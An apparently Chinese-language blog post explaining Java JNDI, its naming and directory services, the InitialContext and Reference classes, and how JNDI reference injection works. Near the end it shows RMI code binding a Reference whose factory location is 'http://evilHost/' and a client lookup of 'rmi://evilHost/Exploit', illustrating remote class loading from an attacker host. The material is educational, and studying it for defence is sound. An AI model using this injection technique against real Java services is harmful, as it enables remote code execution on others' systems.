

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/Decemberus.github-io/img/fluid.png">
  <link rel="icon" href="/Decemberus.github-io/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Decemberus">
  <meta name="keywords" content="">
  
    <meta name="description" content="JNDI注入分析什么是JNDIJNDI(Java Naming and Directory Interface)是Java提供的Java命名和目录接口。通过调用JNDI的API可以定位资源和其他程序对象。JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。 Naming Service 命名服务命名服务将名称和对象进行关联">
<meta property="og:type" content="article">
<meta property="og:title" content="JNDI注入分析">
<meta property="og:url" content="https://decemberus.github.io/Decemberus.github-io/2022/12/19/JNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="欢迎回来">
<meta property="og:description" content="JNDI注入分析什么是JNDIJNDI(Java Naming and Directory Interface)是Java提供的Java命名和目录接口。通过调用JNDI的API可以定位资源和其他程序对象。JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。 Naming Service 命名服务命名服务将名称和对象进行关联">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027022.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027659.png">
<meta property="og:image" content="d:/mdimage/image-20230226192019661.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027009.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027472.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192034081.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192028480.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031866.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031505.png">
<meta property="og:image" content="d:/mdimage/image-20230309203535976.png">
<meta property="og:image" content="d:/mdimage/image-20230309211408157.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192036922.png">
<meta property="og:image" content="d:/mdimage/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png">
<meta property="og:image" content="d:/mdimage/b956cc02-77f5-47b0-91fb-b50bd619731e.png">
<meta property="article:published_time" content="2022-12-19T12:49:47.000Z">
<meta property="article:modified_time" content="2023-03-27T15:00:23.167Z">
<meta property="article:author" content="Decemberus">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027022.png">
  
  
  <title>JNDI注入分析 - 欢迎回来</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/Decemberus.github-io/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/Decemberus.github-io/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/Decemberus.github-io/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"decemberus.github.io","root":"/Decemberus.github-io/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/Decemberus.github-io/local-search.xml"};
  </script>
  <script  src="/Decemberus.github-io/js/utils.js" ></script>
  <script  src="/Decemberus.github-io/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/Decemberus.github-io/">
      <strong>enjoy的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Decemberus.github-io/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Decemberus.github-io/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Decemberus.github-io/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Decemberus.github-io/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/Decemberus.github-io/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/Decemberus.github-io/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="JNDI注入分析"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-12-19 20:49" pubdate>
          2022年12月19日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          22k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          181 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">JNDI注入分析</h1>
            
            <div class="markdown-body">
              
              <h1 id="JNDI注入分析"><a href="#JNDI注入分析" class="headerlink" title="JNDI注入分析"></a>JNDI注入分析</h1><h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是<code>Java</code>提供的<code>Java</code>命名和目录接口。通过调用<code>JNDI</code>的<code>API</code>可以定位资源和其他程序对象。<br><code>JNDI</code>是<code>Java EE</code>的重要部分，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p>
<h3 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service 命名服务"></a>Naming Service 命名服务</h3><p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：<code>DNS</code>系统将计算机名和<code>IP</code>地址进行关联、文件系统将文件名和文件句柄进行关联等等。<br>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。<br>其中另一个值得一提的名称服务为 <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，其名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name</code>&#x2F;<code>value</code> 对，以等号分隔。比如一个 <code>LDAP</code> 名称如下:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">cn</span>=John, <span class="hljs-attribute">o</span>=Sun, <span class="hljs-attribute">c</span>=US<br></code></pre></td></tr></table></figure>

<p>即表示在 <code>c=US</code> 的子域中查找 <code>o=Sun</code> 的子域，再在结果中查找 <code>cn=John</code> 的对象。关于 <code>LDAP</code> 的详细介绍见后文。</p>
<p>在名称系统中，有几个重要的概念。<br><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。<br><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。<br><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p>
<h3 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service 目录服务"></a>Directory Service 目录服务</h3><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。<br>一些典型的目录服务有:<br><code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；<br><code>Active Directory</code>: 为 <code>Windows</code> 域网络设计，包含多个目录服务，比如域名服务、证书服务等；<br>其他基于 <code>LDAP</code> 协议实现的目录服务；<br>总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。<br>在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。</p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>根据上面的介绍，我们知道目录服务是中心化网络应用的一个重要组件。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。在 <code>Java</code> 应用中除了以常规方式使用名称服务(比如使用 <code>DNS</code> 解析域名)，另一个常见的用法是使用目录服务作为对象存储的系统，即用目录服务来存储和获取 <code>Java</code> 对象。<br>比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 <code>Java</code> 对象进行实际的打印操作。<br>为此，就有了 <code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。<br><code>JNDI</code> 架构上主要包含两个部分，即 <code>Java</code> 的应用层接口和 <code>SPI</code>，如下图所示:</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027022.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="JNDI架构图.png"> </p>
<p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 <code>JDK</code> 中包含了下述内置的目录服务:<br><code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；<br><code>LDAP</code>: 轻量级目录访问协议；<br><code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；<br>除此之外，用户还可以在 <code>Java</code> 官网下载其他目录服务实现。由于 <code>SPI</code> 的统一接口，厂商也可以提供自己的私有目录服务实现，用户可无需重复修改代码。<br>为了更好理解 <code>JNDI</code>，我们需要了解其背后的服务提供者(<code>Service Provider</code>)，这些目录服务本身和 <code>JNDI</code> 有没直接耦合性，但基于 <code>SPI</code> 接口和 <code>JNDI</code> 构建起了重要的联系。</p>
<h2 id="JNDI的结构"><a href="#JNDI的结构" class="headerlink" title="JNDI的结构"></a>JNDI的结构</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。<br>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。<br></code></pre></td></tr></table></figure>

<h3 id="类介绍"><a href="#类介绍" class="headerlink" title="类介绍"></a>类介绍</h3><h4 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h4><p>构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext();<br><span class="hljs-comment">//构建一个初始上下文</span><br>InitialContext();<br><span class="hljs-comment">//构建上下文并选择不初始化它</span><br>InitialContext(Hashtable&lt;?,?&gt; environment)<br><span class="hljs-comment">//使用提供的环境构建初始上下文</span><br></code></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将名称绑定到对象。 </span><br>bind(Name name, Object obj) <br><span class="hljs-comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br>list(String name) <br><span class="hljs-comment">//检索命名对象。</span><br>lookup(String name)  <br><span class="hljs-comment">//将名称绑定到对象，覆盖任何现有绑定。</span><br>rebind(String name, Object obj) <br><span class="hljs-comment">//取消绑定命名对象。</span><br>unbind(String name)  <br></code></pre></td></tr></table></figure>

<p>实例如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ini</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        ini.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这段代码中lookup会去uri中查找对应对象并返回引用</p>
<h4 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h4><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了<code>JNDI</code>中类的引用功能。</p>
<p>构造方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//为类名为“className”的对象构造一个新的引用。</span><br>Reference(String className) <br><span class="hljs-comment">//为类名为“className”的对象和地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr) <br><span class="hljs-comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr, String factory, String factoryLocation) <br><span class="hljs-comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br>Reference(String className, String factory, String factoryLocation)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数：</span><br><span class="hljs-comment">className 远程加载时所使用的类名(引用名称)</span><br><span class="hljs-comment">factory  加载的class中需要实例化类的名称（引用类型）</span><br><span class="hljs-comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将地址添加到索引posn的地址列表中。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> <br><span class="hljs-comment">//将地址添加到地址列表的末尾。 </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> <br><span class="hljs-comment">//从此引用中删除所有地址。  </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索索引posn上的地址。 </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索地址类型为“addrType”的第一个地址。  </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> <br><span class="hljs-comment">//检索本参考文献中地址的列举。 </span><br>Enumeration&lt;RefAddr&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索引用引用的对象的类名。 </span><br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用的对象的工厂位置。  </span><br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用对象的工厂的类名。  </span><br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//从地址列表中删除索引posn上的地址。    </span><br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索此引用中的地址数。 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//生成此引用的字符串表示形式。</span><br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> <br></code></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Renference</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;rmi://127.0.0.1:8080&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">renference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(renference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>主要问题在于为何使用了<code>ReferenceWrapper</code></p>
<p>因为<code>Reference</code>类没有实现<code>Remote</code>和继承<code>UnicastRemoteObject</code>类，所以需要用<code>ReferenceWrapper</code>封装一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ReferenceWrapper.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReferenceWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteReference</span> &#123;<br>    <span class="hljs-keyword">protected</span> Reference wrappee;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6078186197417641456L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReferenceWrapper</span><span class="hljs-params">(Reference var1)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;<br>        <span class="hljs-built_in">this</span>.wrappee = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.wrappee;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>关于继承<code>UnicastRemoteObject</code>的原因</p>
<p>在Java RMI中，要将一个远程对象导出（即使其成为远程可调用的对象），需要将其扩展为<code>java.rmi.server.UnicastRemoteObject</code>类的子类。这是因为<code>UnicastRemoteObject</code>类提供了一些必要的支持，使得对象能够在远程机器上进行调用。</p>
<p>具体来说，当一个Java对象通过RMI被远程调用时，需要进行序列化（即将对象转换成一系列字节，以便在网络上传输），然后将序列化后的字节传输到远程机器上进行反序列化（即将字节重新转换成对象）。<code>UnicastRemoteObject</code>类提供了默认的序列化和反序列化机制，以及一些基础的RMI支持。</p>
</blockquote>
<h2 id="JNDI-References注入"><a href="#JNDI-References注入" class="headerlink" title="JNDI References注入"></a>JNDI References注入</h2><p>为了在命名服务或目录服务中绑定<code>Java</code>对象，可以使用<code>Java</code>序列化来传输对象，但有时候不太合适，比如<code>Java</code>对象较大的情况。因此JNDI定义了命名引用(<code>Naming References</code>)，后面直接简称引用(<code>References</code>)。这样对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。<br>引用由<code>Reference</code>类来表示，它由地址(<code>RefAddress</code>)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的<code>Java</code>类名，以及用于创建对象的<code>ObjectFactory</code>类的名称和位置。<br><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象。</p>
<p>所谓的 <code>JNDI</code> 注入就是控制 <code>lookup</code> 函数的参数，这样来使客户端访问恶意的 <code>RMI</code> 或者 <code>LDAP</code> 服务来加载恶意的对象，从而执行代码，完成利用<br>在 <code>JNDI</code> 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 <code>Reference</code> 类实现的。<code>Reference</code> 类表示对存在于命名&#x2F;目录系统以外的对象的引用。<br>具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载 <code>class</code> 字节码文件来实例化</p>
<p><code>Reference</code> 类常用属性：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">className 远程加载时所使用的类名<br>classFactory 加载的 <span class="hljs-keyword">class</span> 中需要实例化类的名称<br><span class="hljs-symbol">classFactoryLocation</span> 提供 <span class="hljs-symbol">classes</span> 数据的地址可以是 <span class="hljs-symbol">file</span>/<span class="hljs-symbol">ftp</span>/<span class="hljs-symbol">http</span> 等协议<br></code></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> );           <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure>

<p>此时，假设使用 <code>rmi</code> 协议，客户端通过 <code>lookup</code> 函数请求上面 <code>bind</code> 设置的 <code>Exploit</code></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Context ctx <span class="hljs-operator">=</span> new InitialContext()<span class="hljs-comment">;</span><br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

